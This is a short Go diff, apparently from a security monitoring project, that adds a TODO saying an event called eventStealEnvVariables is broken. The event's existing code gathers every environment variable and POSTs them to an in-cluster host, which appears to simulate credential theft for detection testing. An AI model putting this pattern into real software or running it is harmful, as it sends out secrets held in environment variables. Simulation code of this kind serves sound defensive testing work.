@@ -147,6 +147,7 @@ func (e *eventStealEnvVariables) getName() string {
 
 func (e *eventStealEnvVariables) run(ctx context.Context) error {
 	envs := os.Environ()
+	// TODO(patrick.pichler): This is broken for sure, either think about how to fix it, or delete it.
 	req, err := http.NewRequestWithContext(ctx, http.MethodPost, "http://kvisord-server.kvisord", strings.NewReader(strings.Join(envs, ",")))
 	if err != nil {
 		return err
